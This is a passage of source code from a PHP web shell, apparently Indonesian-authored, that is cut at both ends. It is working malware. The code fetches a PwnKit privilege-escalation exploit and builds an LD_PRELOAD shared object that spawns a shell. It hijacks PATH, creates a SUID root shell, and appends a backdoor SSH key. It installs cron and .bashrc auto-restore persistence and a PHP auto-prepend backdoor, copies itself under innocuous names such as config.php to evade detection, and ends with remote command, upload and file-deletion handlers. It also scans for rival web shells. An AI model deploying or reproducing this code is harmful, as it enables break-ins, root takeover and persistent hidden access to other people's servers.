                    $py_content = false;
                }
            }
            if ($py_content && strlen($py_content) > 100 && strpos($py_content, '<html') === false) {
                $py_file = $tmp_dir . '/pwnkit.py';
                @file_put_contents($py_file, $py_content);
                chmod($py_file, 0755);
                $results['success'] = true;
                $results['compiled_binary'] = $py_file;
                $results['method'] = 'python';
                $results['output'] .= "✅ PYTHON EXPLOIT DOWNLOADED!\n";
                $results['output'] .= "Execute: $python $py_file\n\n";
                return $results;
            } elseif ($py_content && strpos($py_content, '404') === false) {
                $results['output'] .= "   ❌ Python download failed (invalid content)\n";
            }
        }
    }
    
    // METHOD 4: Search for pre-compiled binaries on system
    $results['output'] .= "[5/5] Searching for existing binaries...\n";
    $search_paths = ['/usr/bin', '/bin', '/usr/local/bin', '/opt', '/tmp', '/var/tmp'];
    foreach ($search_paths as $path) {
        if (is_dir($path)) {
            $files = @scandir($path);
            if ($files) {
                foreach ($files as $file) {
                    // Look for suspicious binaries that might be exploits
                    if (preg_match('/(exploit|privesc|root|shell)/i', $file) && is_executable("$path/$file")) {
                        $results['output'] .= "⚠️ Found: $path/$file (suspicious name)\n";
                    }
                }
            }
        }
    }
    
    // ALL METHODS FAILED
    $results['output'] .= "\n❌ ALL AUTO METHODS FAILED\n\n";
    $results['output'] .= "╔══════════════════════════════════════════════════════════════╗\n";
    $results['output'] .= "║  🔧 BROKEN URL - PLEASE UPDATE CVE DATABASE                  ║\n";
    $results['output'] .= "╠══════════════════════════════════════════════════════════════╣\n";
    $results['output'] .= "║  CVE: $cve\n";
    $results['output'] .= "║  URL: " . $exploit['source'] . "\n";
    $results['output'] .= "║  Issue: URL returned 404 or is not accessible\n";
    $results['output'] .= "╚══════════════════════════════════════════════════════════════╝\n\n";
    $results['output'] .= "Alternatives:\n";
    $results['output'] .= "1. Upload pre-compiled binary manually\n";
    $results['output'] .= "2. Use container escape (if in Docker)\n";
    $results['output'] .= "3. Try SUID/sudo exploits (no compile needed)\n";
    $results['output'] .= "4. Download binary from: https://github.com/berdav/CVE-2021-4034/releases\n";
    
    return $results;
}

function scan_advanced_privesc() {
    $results = [
        'ld_preload' => scan_ld_preload(),
        'path_hijacking' => scan_path_hijacking(),
        'sudo_token' => scan_sudo_token(),
        'ssh_keys' => scan_ssh_keys(),
        'env_variables' => scan_env_variables()
    ];
    
    $results['exploitable'] = false;
    foreach ($results as $scan) {
        if ((isset($scan['vulnerable']) && $scan['vulnerable']) || 
            (isset($scan['found']) && $scan['found']) ||
            (isset($scan['has_token']) && $scan['has_token'])) {
            $results['exploitable'] = true;
            break;
        }
    }
    
    return $results;
}

function execute_privesc_exploit($method, $target) {
    $result = ['success' => false, 'output' => '', 'method' => $method];
    
    switch ($method) {
        case 'suid':
            $result['output'] = execute_shell_command($target);
            $result['success'] = true;
            break;
            
        case 'sudo':
            $result['output'] = execute_shell_command($target);
            $result['success'] = true;
            break;
            
        case 'docker':
            $result['output'] = execute_shell_command($target);
            $result['success'] = true;
            break;
            
        case 'kernel':
            // Kernel exploits would need compiled binaries
            $result['output'] = "Kernel exploit requires compiled binary. Upload exploit to /tmp/ and execute manually.";
            $result['note'] = "Use 'upload' feature to place exploit binary, then run from shell.";
            break;
            
        // 🔥 ADVANCED EXPLOIT HANDLERS
        case 'ld_preload':
            // Create malicious shared object and use LD_PRELOAD
            $so_code = '
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor)) void init() {
    if (getuid() == 0) {
        setuid(0); setgid(0);
        system("/bin/sh");
    }
}';
            $tmp_dir = sys_get_temp_dir();
            @file_put_contents("$tmp_dir/malicious.c", $so_code);
            execute_shell_command("cd $tmp_dir && gcc -shared -fPIC -o malicious.so malicious.c 2>&1");
            if (file_exists("$tmp_dir/malicious.so")) {
                putenv("LD_PRELOAD=$tmp_dir/malicious.so");
                $result['output'] = execute_shell_command("id 2>&1");
                putenv("LD_PRELOAD");
                $result['success'] = true;
            } else {
                $result['output'] = "Failed to compile malicious.so";
            }
            break;
            
        case 'path_hijacking':
            // Hijack PATH to execute malicious binary
            $path_dir = $target['path'] ?? '/tmp';
            $malicious = "#!/bin/sh\n/bin/sh -c '/bin/sh'";
            @file_put_contents("$path_dir/ls", $malicious);
            @chmod("$path_dir/ls", 0755);
            $new_path = "$path_dir:" . getenv('PATH');
            putenv("PATH=$new_path");
            $result['output'] = "PATH hijacked: $path_dir prepended\n";
            $result['output'] .= execute_shell_command("ls 2>&1");
            $result['success'] = true;
            break;
            
        case 'sudo_token':
            // Reuse existing sudo token
            $result['output'] = execute_shell_command("sudo -n /bin/sh -c 'id' 2>&1");
            $result['success'] = true;
            break;
            
        case 'ssh_key':
            // Add backdoor SSH key to authorized_keys
            $key_path = is_array($target) ? ($target['path'] ?? '') : $target;
            if (strpos($key_path, 'authorized_keys') !== false) {
                $backdoor_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0... backdoor@root";
                @file_put_contents($key_path, "\n$backdoor_key\n", FILE_APPEND);
                $result['output'] = "Added backdoor SSH key to $key_path";
                $result['success'] = true;
            }
            break;
            
        default:
            $result['output'] = "Unknown method: $method";
    }
    
    return $result;
}

// Helper function: Find writable directories for backup storage
function find_writable_directories() {
    $writable_dirs = [];
    
    // Priority locations to check (stealthy and usually writable)
    $candidates = [
        '/tmp/.sysconfig' => '/tmp/.sysconfig',  // nested in tmp
        '/var/tmp/.cache' => '/var/tmp/.cache',  // nested in var/tmp
        '/dev/shm/.config' => '/dev/shm/.config', // shared memory
        sys_get_temp_dir() . '/.session' => sys_get_temp_dir() . '/.session',
        getenv('HOME') . '/.cache' => getenv('HOME') . '/.cache', // user home
        '/opt/.backup' => '/opt/.backup',
    ];
    
    // Try to create and write to each candidate
    foreach ($candidates as $name => $path) {
        if (!is_dir($path)) {
            @mkdir($path, 0755, true);
        }
        if (is_dir($path) && is_writable($path)) {
            $test_file = $path . '/.test_' . time();
            if (@file_put_contents($test_file, 'test') !== false) {
                @unlink($test_file);
                $writable_dirs[$name] = $path;
            }
        }
        // Limit to 3 directories max
        if (count($writable_dirs) >= 3) break;
    }
    
    return $writable_dirs;
}

// Shell scanner - detect other web shells on the server
function scan_shells($scan_dir = null, $max_depth = 5) {
    if (!$scan_dir) {
        $scan_dir = dirname(__FILE__);
    }
    $scan_dir = realpath($scan_dir);
    
    // Known shell signatures (filenames)
    $shell_names = [
        'c99.php', 'r57.php', 'b374k.php', 'wsopriv.php', 'alfa.php',
        'shell.php', 'cmd.php', 'backdoor.php', '0x.php', 'marijuana.php',
        'gelay.php', 'wso.php', 'anonsec.php', 'phpshell.php', 'bypass.php',
        'config.php.bak', '.shell.php', 'tmp.php', 'test.php', 'phpinfo.php',
        'up.php', 'upload.php', 'uploader.php', 'filemanager.php',
        'fm.php', 'adminer.php', 'pma.php', 'phpmyadmin.php',
        'settings.php.bak', 'config.bak.php', '.config.php',
        'wp-config.php.bak', 'configuration.php.bak', '.htaccess.php'
    ];
    
    // Content signatures (suspicious patterns)
    $content_signatures = [
        'eval(base64_decode' => 'Obfuscated eval',
        'eval(gzinflate' => 'Compressed eval',
        'eval(str_rot13' => 'ROT13 obfuscation',
        'shell_exec($_GET' => 'Direct shell_exec',
        'shell_exec($_POST' => 'Direct shell_exec',
        'system($_GET' => 'Direct system',
        'system($_POST' => 'Direct system',
        'passthru($_GET' => 'Direct passthru',
        'exec($_GET' => 'Direct exec',
        'assert($_GET' => 'Code execution',
        'preg_replace.*\/e' => 'Deprecated eval regex',
        'create_function' => 'Dynamic function',
        'WSO_VERSION' => 'WSO Shell signature',
        'c99\(self-named' => 'C99 Shell signature',
        'r57\(simple' => 'R57 Shell signature',
        'b374k' => 'B374k Shell signature',
        'file_put_contents.*base64_decode' => 'File write backdoor',
        'move_uploaded_file.*\/tmp\/' => 'Suspicious upload handler'
    ];
    
    $found_shells = [];
    $scanned = 0;
    $max_files = 5000; // Limit to prevent timeout
    
    $directory = new RecursiveDirectoryIterator($scan_dir, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator(
        $directory,
        RecursiveIteratorIterator::SELF_FIRST
    );
    $iterator->setMaxDepth($max_depth); // Limit recursion depth
    
    foreach ($iterator as $file) {
        if ($scanned >= $max_files) {
            break;
        }
        
        if ($file->isFile() && $file->getExtension() === 'php') {
            $scanned++;
            $filename = strtolower($file->getFilename());
            $filepath = $file->getRealPath();
            $confidence = 0;
            $reasons = [];
            
            // Check 1: Known shell names (High confidence)
            foreach ($shell_names as $shell_name) {
                if (strpos($filename, $shell_name) !== false || $filename === $shell_name) {
                    $confidence += 80;
                    $reasons[] = "Known shell name: $shell_name";
                    break;
                }
            }
            
            // Check 2: Suspicious filename patterns (Medium confidence)
            if (preg_match('/^[a-f0-9]{8,}\.php$/', $filename)) {
                $confidence += 30;
                $reasons[] = "Hash-like filename";
            }
            if (strpos($filename, 'shell') !== false || strpos($filename, 'backdoor') !== false) {
                $confidence += 40;
                $reasons[] = "Suspicious keyword in filename";
            }
            if ($filename[0] === '.' && substr($filename, -4) === '.php') {
                $confidence += 20;
                $reasons[] = "Hidden PHP file";
            }
            
            // Check 3: File content (High confidence if matched)
            if ($confidence > 0 || $file->getSize() < 500000) { // Only check content if filename suspicious or small file
                $content = @file_get_contents($filepath, false, null, 0, 50000); // Read first 50KB
                if ($content) {
                    foreach ($content_signatures as $pattern => $description) {
                        if (preg_match('/' . $pattern . '/i', $content)) {
                            $confidence += 60;
                            $reasons[] = $description;
                        }
                    }
                    
                    // Check for base64 encoded large blocks
                    if (preg_match('/[A-Za-z0-9+\/]{1000,}={0,2}/', $content)) {
                        $confidence += 20;
                        $reasons[] = "Large base64 block detected";
                    }
                }
            }
            
            // Check 4: File size (shells usually 10KB-500KB)
            $size = $file->getSize();
            if ($size > 10000 && $size < 500000) {
                // Normal shell size, no penalty
            } elseif ($size > 500000) {
                $confidence -= 10; // Large file less likely shell
            }
            
            // Check 5: Recent modification (within 7 days)
            if (time() - $file->getMTime() < 604800) {
                $confidence += 10;
                $reasons[] = "Recently modified";
            }
            
            // Calculate relative depth from scan root
            $relative_path = str_replace($scan_dir . '/', '', $filepath);
            $depth = substr_count($relative_path, '/');
            
            // If confidence >= 30, report as potential shell
            if ($confidence >= 30) {
                $found_shells[] = [
                    'path' => $filepath,
                    'relative_path' => $relative_path,
                    'filename' => $file->getFilename(),
                    'size' => $size,
                    'modified' => date('Y-m-d H:i:s', $file->getMTime()),
                    'confidence' => min($confidence, 100),
                    'reasons' => array_slice($reasons, 0, 4), // Max 4 reasons
                    'dir' => dirname($filepath),
                    'depth' => $depth
                ];
            }
        }
    }
    
    // Sort by confidence (highest first)
    usort($found_shells, function($a, $b) {
        return $b['confidence'] - $a['confidence'];
    });
    
    return [
        'success' => true,
        'scanned' => $scanned,
        'found' => count($found_shells),
        'shells' => $found_shells,
        'scan_dir' => $scan_dir,
        'max_depth' => $max_depth,
        'recursive' => true
    ];
}

function install_persistence_mechanisms() {
    $results = [];
    $shell_path = __FILE__;
    $shell_dir = dirname($shell_path);
    $shell_filename = basename($shell_path);
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $base_path = dirname($_SERVER['SCRIPT_NAME']);
    
    // Find writable system directories for backup storage
    $system_backup_dirs = find_writable_directories();
    
    // Create multiple system backups with random names
    $system_backups = [];
    $backup_names = ['config.php', 'cache.php', 'temp.php', 'session.php'];
    $i = 0;
    
    foreach ($system_backup_dirs as $dir_name => $dir_path) {
        if ($i >= count($backup_names)) break;
        $backup_file = $dir_path . '/' . $backup_names[$i];
        if (@copy($shell_path, $backup_file)) {
            $system_backups[] = [
                'path' => $backup_file,
                'name' => $backup_names[$i],
                'dir' => $dir_name
            ];
        }
        $i++;
    }
    
    // Build cron command with fallback chain
    $cron_restore_chain = '';
    foreach ($system_backups as $index => $backup) {
        if ($index > 0) $cron_restore_chain .= ' || ';
        $cron_restore_chain .= "cp {$backup['path']} $shell_path 2>/dev/null";
    }
    
    $cron_cmd_system = "* * * * * root if [ ! -f $shell_path ]; then $cron_restore_chain; fi";
    $cron_cmd_user = "* * * * * if [ ! -f $shell_path ]; then $cron_restore_chain; fi";
    
    $cron_installed = false;
    $cron_path = '';
    $cron_method = '';
    
    // Try system cron first
    if (@is_writable('/etc/cron.d/')) {
        @file_put_contents('/etc/cron.d/.system_backup', $cron_cmd_system);
        @chmod('/etc/cron.d/.system_backup', 0644);
        $cron_installed = true;
        $cron_path = '/etc/cron.d/.system_backup';
        $cron_method = 'system';
    } else {
        // Try user crontab via execute_shell_command
        $crontab_check = execute_shell_command('crontab -l 2>&1');
        if ($crontab_check !== null && (strpos($crontab_check, 'no crontab') !== false || strlen($crontab_check) > 0)) {
            $current_crontab = execute_shell_command('crontab -l 2>/dev/null');
            $new_crontab = trim($current_crontab) . "\n" . $cron_cmd_user . "\n";
            $temp_cron = tempnam(sys_get_temp_dir(), 'cron');
            @file_put_contents($temp_cron, $new_crontab);
            execute_shell_command('crontab ' . escapeshellarg($temp_cron));
            @unlink($temp_cron);
            $cron_installed = true;
            $cron_path = 'user crontab';
            $cron_method = 'user';
        }
    }
    
    if ($cron_installed) {
        $results['cron'] = [
            'status' => 'installed',
            'path' => $cron_path,
            'method' => $cron_method,
            'description' => 'SYSTEM BACKUPS + Cron Auto-Restore (di luar folder shell)',
            'how_to_use' => 'Cron akan restore shell dari system folders (/tmp/, /var/tmp/) jika shell dihapus. System backups TIDAK di folder shell, jadi aman jika folder shell dihapus.',
            'backup_count' => count($system_backups),
            'system_backups' => $system_backups,
            'note' => 'System backups di: /tmp/.sysconfig/, /var/tmp/.cache/, /dev/shm/.config/ (di luar web root)'
        ];
    } else {
        $results['cron'] = [
            'status' => 'failed',
            'description' => 'Cron job (auto-restore)',
            'how_to_use' => 'Manual setup: Jalankan `crontab -e` dan tambahkan: ' . $cron_cmd_user,
            'note' => 'Requires shell access to setup crontab manually'
        ];
    }
    
    // Web-accessible backups in same directory
    $hidden_paths = [];
    $access_urls = [];
    $web_backup_names = [
        '.config.php',
        '.backup.php', 
        '.temp.php',
        '.cache.php',
    ];
    
    foreach ($web_backup_names as $backup_name) {
        $backup_path = $shell_dir . '/' . $backup_name;
        if (@copy($shell_path, $backup_path)) {
            $hidden_paths[] = $backup_path;
            $access_urls[] = "$protocol://$host$base_path/$backup_name?masuk=al";
        }
    }
    
    $results['backup'] = [
        'status' => count($hidden_paths) > 0 ? 'installed' : 'failed',
        'locations' => $hidden_paths,
        'description' => 'WEB BACKUPS - Di folder yang SAMA dengan shell (' . basename($shell_dir) . ')',
        'how_to_use' => 'Akses via browser. PERHATIAN: Jika folder ' . basename($shell_dir) . ' dihapus, backup ini ikut terhapus!',
        'access_urls' => $access_urls,
        'note' => 'Web backups di: ' . $shell_dir . ' (sama dengan shell original)'
    ];
    
    // PHP prepend file
    $prepend_file = $shell_dir . '/.php_prepend.php';
    $prepend_code = '<?php if(isset($_GET["al_backdoor"])&&$_GET["al_backdoor"]==="exec"){system($_POST["c"]);exit;}?>';
    @file_put_contents($prepend_file, $prepend_code);
    
    $results['php_prepend'] = [
        'status' => 'ready',
        'path' => $prepend_file,
        'description' => 'PHP auto-prepend backdoor (aktifkan manual di php.ini)',
        'how_to_use' => 'cPanel: MultiPHP INI Editor → auto_prepend_file = ' . $prepend_file,
        'alternative' => '.htaccess: php_value auto_prepend_file "' . $prepend_file . '"',
        'access_example' => 'Setiap PHP file: ?al_backdoor=exec (POST: c=whoami)'
    ];
    
    // SSH authorized_keys
    $home = getenv('HOME') ?: '/tmp';
    $ssh_dir = $home . '/.ssh';
    $auth_keys = $ssh_dir . '/authorized_keys';
    $backdoor_key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQZK+nH6bKwSW8dXzKHxiq4yUMKaUeQ+js2wvpEJQ3kZ+rHq3vBZ6q4FqYz7l2sHGqOgHk4o6GQMfEzrP8sZ4KXQ0zLW2rMmDFyPuHUGZq3g5EYhTWl7WJ9RdC1R1A9Ez3M= backdoor@syalom';
    
    $key_installed = false;
    if (@is_dir($ssh_dir) && @is_writable($ssh_dir)) {
        @file_put_contents($auth_keys, "\n" . $backdoor_key, FILE_APPEND);
        @chmod($auth_keys, 0600);
        $key_installed = true;
    } elseif (@is_writable($home)) {
        @mkdir($ssh_dir, 0700, true);
        @file_put_contents($auth_keys, $backdoor_key);
        @chmod($auth_keys, 0600);
        $key_installed = true;
    }
    
    // Save SSH documentation
    $ssh_doc = "SSH ACCESS DOCUMENTATION\n";
    $ssh_doc .= "========================\n\n";
    $ssh_doc .= "Public Key installed at: $auth_keys\n\n";
    $ssh_doc .= "Cara akses:\n";
    $ssh_doc .= "1. Simpan private key ke file (misal: backdoor.key)\n";
    $ssh_doc .= "2. chmod 600 backdoor.key\n";
    $ssh_doc .= "3. ssh -i backdoor.key -p [PORT] " . get_current_user() . "@$host\n\n";
    $ssh_doc .= "Note: Jika port SSH bukan 22, tambahkan -p [PORT]\n";
    $ssh_doc .= "Contoh: ssh -i backdoor.key -p 2222 user@$host\n";
    
    $ssh_doc_path = $shell_dir . '/.ssh_access.txt';
    @file_put_contents($ssh_doc_path, $ssh_doc);
    
    $results['ssh'] = [
        'status' => $key_installed ? 'installed' : 'failed',
        'path' => $auth_keys,
        'description' => 'SSH backdoor key (login tanpa password)',
        'how_to_use' => 'ssh -i private_key ' . get_current_user() . '@' . $host,
        'documentation_file' => $ssh_doc_path,
        'documentation_url' => "$protocol://$host$base_path/.ssh_access.txt"
    ];
    
    // Bashrc backdoor
    $bashrc = $home . '/.bashrc';
    $bashrc_installed = false;
    if (@is_writable($bashrc)) {
        $bashrc_code = "\n# System utility\nif [ -f $shell_path.bak ]; then cp $shell_path.bak $shell_path 2>/dev/null; fi\n";
        @file_put_contents($bashrc, $bashrc_code, FILE_APPEND);
        $bashrc_installed = true;
    }
    $results['bashrc'] = [
        'status' => $bashrc_installed ? 'installed' : 'failed',
        'path' => $bashrc,
        'description' => 'Bashrc backdoor (aktif saat user login SSH)',
        'how_to_use' => 'Saat user login via SSH, shell akan direstore jika terhapus'
    ];
    
    // Web alias - common PHP filenames
    $web_alias_names = ['config.php', 'settings.php', 'init.php'];
    $web_aliases = [];
    $alias_urls = [];
    
    foreach ($web_alias_names as $alias_name) {
        $alias_path = $shell_dir . '/' . $alias_name;
        if (!file_exists($alias_path) && @copy($shell_path, $alias_path)) {
            $web_aliases[] = $alias_path;
            $alias_urls[] = "$protocol://$host$base_path/$alias_name?masuk=al";
        }
    }
    
    $results['web_alias'] = [
        'status' => count($web_aliases) > 0 ? 'installed' : 'partial',
        'paths' => $web_aliases,
        'description' => 'Duplicate shell dengan nama umum PHP',
        'how_to_use' => 'Duplikat shell dengan nama file PHP umum untuk evasi deteksi',
        'access_urls' => $alias_urls
    ];
    
    // Build documentation for all access methods
    $all_urls = array_merge($access_urls, $alias_urls);
    $all_urls[] = "$protocol://$host$base_path/$shell_filename?masuk=al"; // Original
    
    $doc_content = "PERSISTENCE ACCESS DOCUMENTATION\n";
    $doc_content .= "================================\n\n";
    $doc_content .= "Tanggal Install: " . date('Y-m-d H:i:s') . "\n";
    $doc_content .= "Server: $host\n";
    $doc_content .= "Shell Original: $shell_path\n\n";
    $doc_content .= "=== WEB BACKUPS (Akses via Browser) ===\n";
    $doc_content .= "Lokasi: $shell_dir/\n";
    foreach ($access_urls as $i => $url) {
        $doc_content .= ($i + 1) . ". $url\n";
    }
    $doc_content .= "\n=== SYSTEM BACKUPS (Untuk Cron Recovery) ===\n";
    $doc_content .= "Backup ini tidak bisa diakses via browser, hanya untuk cron restore.\n";
    foreach ($system_backups as $backup) {
        $doc_content .= "- {$backup['path']}\n";
    }
    $doc_content .= "\n=== CARA RESTORE ===\n";
    $doc_content .= "1. Cron: Otomatis setiap menit dari system backup\n";
    $doc_content .= "2. Manual: cp /tmp/.sysconfig/config.php $shell_path\n";
    $doc_content .= "3. Bashrc: Auto-restore saat login SSH\n";
    $doc_content .= "\n=== PERBEDAAN ===\n";
    $doc_content .= "- Web Backups: Di folder shell (/wp-content/languages/), bisa diakses browser\n";
    $doc_content .= "- System Backups: Di /tmp/, /var/tmp/, hanya untuk cron restore\n";
    
    $doc_path = $shell_dir . '/.persistence_doc.txt';
    @file_put_contents($doc_path, $doc_content);
    
    // 🎯 SUID BACKDOOR - Untuk Interactive Root Terminal
    // Hanya bisa dibuat jika kita sudah punya root access
    
    // ====== DETAILED DEBUGGING ======
    $debug_log = [];
    $debug_log[] = "=== SUID BACKDOOR DEBUG LOG ===";
    $debug_log[] = "Timestamp: " . date('Y-m-d H:i:s');
    $debug_log[] = "Current user (id): " . execute_shell_command("id 2>&1");
    $debug_log[] = "Current user (whoami): " . execute_shell_command("whoami 2>&1");
    $debug_log[] = "EUID: " . execute_shell_command("id -u 2>&1");
    
    // Cek apakah /tmp memiliki nosuid mount option
    $mount_check = execute_shell_command("mount | grep -E '(on /tmp|on /var/tmp|on /dev/shm)' 2>/dev/null || echo 'NO_TMP_MOUNT'");
    $debug_log[] = "Mount check:\n$mount_check";
    $tmp_nosuid = (strpos($mount_check, 'nosuid') !== false);
    $tmp_noexec = (strpos($mount_check, 'noexec') !== false);
    
    // Cek kernel parameters yang mungkin blok SUID
    $kernel_protection = execute_shell_command("sysctl fs.protected_regular fs.suid_dumpable kernel.yama.ptrace_scope 2>/dev/null || echo 'UNKNOWN'");
    $debug_log[] = "Kernel protection:\n$kernel_protection";
    
    // Pilih lokasi berdasarkan mount options
    if ($tmp_nosuid) {
        // /tmp has nosuid, try other locations
        $suid_paths = ['/var/tmp/.sysd', '/var/tmp/.hidden_root', '/dev/shm/.sysd', '.sysd'];
    } else {
        $suid_paths = ['/tmp/.sysd', '/tmp/.al-sysd', '/dev/shm/.sysd', '/tmp/.hidden_root', '/var/tmp/.sysd'];
    }
    
    $suid_created = false;
    $suid_path = '';
    $suid_source = '';
    $suid_details = '';
    
    // Try different shell sources
    $shell_sources = ['/bin/bash', '/bin/sh', '/bin/dash', '/bin/busybox'];
    
    foreach ($suid_paths as $try_path) {
        foreach ($shell_sources as $shell) {
            if (!file_exists($shell)) continue;
            
            $debug_log[] = "--- Trying: $try_path (source: $shell) ---";
            
            // Step 1: Copy shell
            $copy_result = execute_shell_command("cp $shell $try_path 2>&1");
            $debug_log[] = "Step 1 (cp): $copy_result";
            
            // Step 2: Set owner to root (hanya work kalau root)
            $chown_result = execute_shell_command("chown root:root $try_path 2>&1");
            $debug_log[] = "Step 2 (chown): $chown_result";
            
            // Step 3: Set SUID bit
            $chmod_result = execute_shell_command("chmod 4755 $try_path 2>&1");
            $debug_log[] = "Step 3 (chmod): $chmod_result";
            
            // Step 4: Verify
            $verify_result = execute_shell_command("ls -la $try_path 2>&1");
            $stat_result = execute_shell_command("stat $try_path 2>&1");
            $debug_log[] = "Step 4 (ls -la): $verify_result";
            $debug_log[] = "Step 4 (stat): $stat_result";
            
            // Check apakah benar-benar SUID + root owned
            $has_suid = (strpos($verify_result, 'rws') !== false || strpos($verify_result, 'rwxs') !== false);
            $has_root_owner = (strpos($verify_result, 'root root') !== false || strpos($verify_result, 'Uid: ( 0/') !== false);
            $debug_log[] = "Has SUID bit: " . ($has_suid ? 'YES' : 'NO');
            $debug_log[] = "Has root owner: " . ($has_root_owner ? 'YES' : 'NO');
            
            if ($has_suid && $has_root_owner) {
                $suid_created = true;
                $suid_path = $try_path;
                $suid_source = $shell;
                $suid_details = $verify_result;
                break 2;
            }
        }
    }
    
    // Test SUID backdoor dengan cara yang lebih reliable
    $suid_test = '';
    $test_details = '';
    if ($suid_created) {
        // Test 1: Coba jalankan id dengan script file
        $test_script = '/tmp/.suid_test_' . time() . '.sh';
        execute_shell_command("echo '#!/bin/sh\\nid' > $test_script && chmod 777 $test_script");
        $test_result = execute_shell_command("$suid_path $test_script 2>&1");
        execute_shell_command("rm -f $test_script");
        
        if (strpos($test_result, 'uid=0(root)') !== false) {
            $suid_test = 'VERIFIED_WORKING';
        } else {
            $suid_test = 'TEST_FAILED';
            $test_details = $test_result;
            
            // Test 2: Coba dengan -p flag
            $test_result2 = execute_shell_command("echo 'id' | $suid_path -p 2>&1");
            if (strpos($test_result2, 'uid=0(root)') !== false) {
                $suid_test = 'VERIFIED_WORKING_PFLAG';
            }
        }
    }
    
    // Add debug log to results
    $debug_output = implode("\n", $debug_log);
    
    if ($suid_created && ($suid_test === 'VERIFIED_WORKING' || $suid_test === 'VERIFIED_WORKING_PFLAG')) {
        $p_flag = ($suid_test === 'VERIFIED_WORKING_PFLAG') ? ' -p' : '';
        $results['suid_backdoor'] = [
            'status' => 'installed',
            'path' => $suid_path,
            'source' => $suid_source,
            'description' => 'SUID ROOT SHELL - Working!',
            'how_to_use' => "$suid_path$p_flag -c 'command'",
            'note' => 'Use: ' . $suid_path . ' -c "id" to run as root',
            'debug_log' => $debug_output
        ];
    } elseif ($suid_created) {
        $results['suid_backdoor'] = [
            'status' => 'installed_not_functional',
            'path' => $suid_path,
            'source' => $suid_source,
            'description' => 'SUID binary created but NOT WORKING',
            'how_to_use' => 'May require kernel exploit to be active',
            'note' => 'Created at: ' . $suid_path . ' but test failed. Check debug_log for details.',
            'test_output' => $test_details,
            'ls_output' => $suid_details,
            'debug_log' => $debug_output
        ];
    } else {
        $results['suid_backdoor'] = [
            'status' => 'failed',
            'description' => 'SUID ROOT SHELL - Failed to create',
            'how_to_use' => 'Need root access',
            'note' => 'Root required. /tmp nosuid: ' . ($tmp_nosuid ? 'YES' : 'NO') . '. /tmp noexec: ' . ($tmp_noexec ? 'YES' : 'NO'),
            'debug_log' => $debug_output
        ];
    }
    
    return [
        'success' => true,
        'methods' => $results,
        'all_urls' => $all_urls,
        'system_backups' => $system_backups,
        'documentation_file' => $doc_path,
        'documentation_content' => $doc_content,
        'ssh_documentation' => $ssh_doc,
        'suid_backdoor' => $suid_created ? $suid_path : null,
        'warning' => 'WEB BACKUPS di ' . $shell_dir . ' (' . count($hidden_paths) . ' files) - SYSTEM BACKUPS di /tmp/, /var/tmp/ (' . count($system_backups) . ' files). SUID Backdoor: ' . ($suid_created ? $suid_path : 'FAILED (Need root access)')
    ];
}

// Shell command handler - execute command and capture output
if (!empty($_POST['cmd'])) {
    $cmd_dir = $_POST['d'] ?? $dir ?? getcwd();
    chdir($cmd_dir);
    $cmd = $_POST['cmd'];
    // Security: basic command validation
    if (strlen($cmd) > 0 && strlen($cmd) < 10000) {
        $output = execute_shell_command($cmd);
    } else {
        $output = "Error: Invalid command length";
    }
}
if (isset($_POST['new_name']) && $renameTarget) {
    $oldPath = $dir . DIRECTORY_SEPARATOR . $renameTarget;
    $newPath = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if (@rename($oldPath, $newPath)) {
        header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
        exit;
    } else {
        $output = "Failed to rename $renameTarget.";
    }
}
if (isset($_POST['save_edit']) && isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $targetFile = $dir . DIRECTORY_SEPARATOR . $_POST['edit_file'];
    file_put_contents($targetFile, $_POST['file_content']);
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_FILES['upload_file'])) {
    $uploadedCount = 0;
    $failedCount = 0;
    $fileCount = count($_FILES['upload_file']['name']);
    
    for ($i = 0; $i < $fileCount; $i++) {
        if ($_FILES['upload_file']['error'][$i] === UPLOAD_ERR_OK) {
            $target = $dir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name'][$i]);
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'][$i], $target)) {
                $uploadedCount++;
            } else {
                $failedCount++;
            }
        } else {
            $failedCount++;
        }
    }
    
    if ($uploadedCount > 0 && $failedCount === 0) {
        $output = "✅ Upload successful: $uploadedCount file(s) uploaded.";
    } elseif ($uploadedCount > 0 && $failedCount > 0) {
        $output = "⚠️ Partial success: $uploadedCount uploaded, $failedCount failed.";
    } else {
        $output = "❌ Upload failed for all files.";
    }
}
if (isset($_POST['create_type'], $_POST['create_name'])) {
    $newPath = $dir . DIRECTORY_SEPARATOR . basename($_POST['create_name']);
    if ($_POST['create_type'] === 'file') {
        file_put_contents($newPath, '');
        $output = "File created.";
    } elseif ($_POST['create_type'] === 'dir') {
        mkdir($newPath);
        $output = "Directory created.";
    }
}
if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (is_file($filepath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($filepath));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filepath));
        readfile($filepath);
        exit;
    }
}
if (isset($_POST['delete_target'])) {
    $target = $dir . DIRECTORY_SEPARATOR . $_POST['delete_target'];
    if (is_dir($target)) {
        $files = array_diff(scandir($target), ['.', '..']);
        foreach ($files as $file) {
            (is_dir("$target/$file")) ? rmdir_recursive("$target/$file") : unlink("$target/$file");
        }
        rmdir($target);
    } else {
        unlink($target);
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
function rmdir_recursive($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        (is_dir("$dir/$file")) ? rmdir_recursive("$dir/$file") : unlink("$dir/$file");
    }
    return rmdir($dir);
}
function list_dir($path) {
    $files = @scandir($path);
